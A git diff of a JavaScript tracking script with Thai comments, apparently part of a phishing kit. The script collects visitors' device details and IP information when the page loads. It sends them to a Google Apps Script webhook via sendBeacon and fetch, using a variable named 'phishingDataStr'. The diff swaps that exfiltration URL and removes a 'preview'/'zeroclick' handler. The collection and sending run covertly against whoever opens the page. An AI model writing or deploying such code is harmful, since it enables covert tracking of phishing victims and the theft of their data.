@@ -158,7 +158,7 @@ window.addEventListener('beforeunload', function() {
         console.log("ส่งข้อมูลในช่วง beforeunload ด้วย beacon");
         
         // ส่งข้อมูลด้วย beacon
-        const webhookUrl = 'https://script.google.com/macros/s/AKfycbyMI1R7KKdgPFBxtFIaIZ11nT1iMCL4QCjP2vWibPAwiTk6sYzYP9XiXRddnTfKKFBa/exec';
+        const webhookUrl = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
         const blob = new Blob([phishingDataStr], {type: 'application/json'});
         
         if (navigator.sendBeacon(webhookUrl, blob)) {
@@ -196,7 +196,6 @@ window.addEventListener('beforeunload', function() {
     return; // หยุดการทำงานของสคริปต์
   }
   console.log("Tracking key is present:", trackingKey);
-  console.log("Request source:", source);
 
   // --- รวบรวมข้อมูลเบื้องต้น ---
   const deviceInfo = getDetailedDeviceInfo();
@@ -244,13 +243,6 @@ window.addEventListener('beforeunload', function() {
 
   // เตรียมข้อมูลสำหรับ beacon (ในกรณีผู้ใช้ออกจากหน้าเว็บกะทันหัน)
   prepareDataForBeacon(dataToSend);
-
-  // ถ้าเป็นการเข้าถึงแบบ preview ให้ประมวลผลแบบพิเศษ
-  if (source === 'preview') {
-    console.log("Processing preview request...");
-    processPreviewRequest(dataToSend);
-    return; // จบการทำงานหลังจากประมวลผล preview
-  }
 
   // --- เริ่มรวบรวมข้อมูลแบบ Asynchronous ---
 
@@ -320,7 +312,7 @@ window.addEventListener('beforeunload', function() {
       
       // ตรวจสอบว่าสามารถใช้ fetch ได้หรือไม่
       if (window.fetch) {
-        fetch('https://script.google.com/macros/s/AKfycbyMI1R7KKdgPFBxtFIaIZ11nT1iMCL4QCjP2vWibPAwiTk6sYzYP9XiXRddnTfKKFBa/exec', {
+        fetch('https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -350,34 +342,6 @@ window.addEventListener('beforeunload', function() {
 
 })(); // End of main IIFE
 
-// ฟังก์ชันใหม่สำหรับประมวลผลการเข้าถึงแบบ preview
-async function processPreviewRequest(initialData) {
-  try {
-    console.log("Processing preview request for key:", initialData.trackingKey);
-    
-    // รวบรวมข้อมูลเท่าที่จำเป็นสำหรับ preview
-    const ipDetails = await getIPDetails();
-    const dataToSend = {
-      ...initialData,
-      ip: ipDetails,
-      timestamp: new Date().toLocaleString('th-TH', {
-        timeZone: 'Asia/Bangkok',
-        year: 'numeric', month: '2-digit', day: '2-digit',
-        hour: '2-digit', minute: '2-digit', second: '2-digit'
-      }),
-      source: 'zeroclick', // เปลี่ยนจาก preview เป็น zeroclick สำหรับการบันทึก
-      requestId: initialData.requestId || generateUniqueId()
-    };
-    
-    // ส่งข้อมูล (ใช้ sendBeacon เพื่อให้แน่ใจว่าข้อมูลถูกส่ง แม้หน้าเว็บจะปิดเร็ว)
-    sendDataWithBeacon(dataToSend);
-    
-    console.log("Preview data sent:", dataToSend);
-  } catch (error) {
-    console.error("Error processing preview request:", error);
-  }
-}
-
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
   const timestamp = Date.now().toString(36);
@@ -394,7 +358,7 @@ function generateUniqueId() {
 
 // ฟังก์ชันส่งข้อมูลด้วย navigator.sendBeacon()
 function sendDataWithBeacon(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbyMI1R7KKdgPFBxtFIaIZ11nT1iMCL4QCjP2vWibPAwiTk6sYzYP9XiXRddnTfKKFBa/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
   const currentRequestId = dataToSend.requestId;
 
   // ตรวจสอบว่าเคยส่ง requestId นี้ใน session นี้หรือยัง
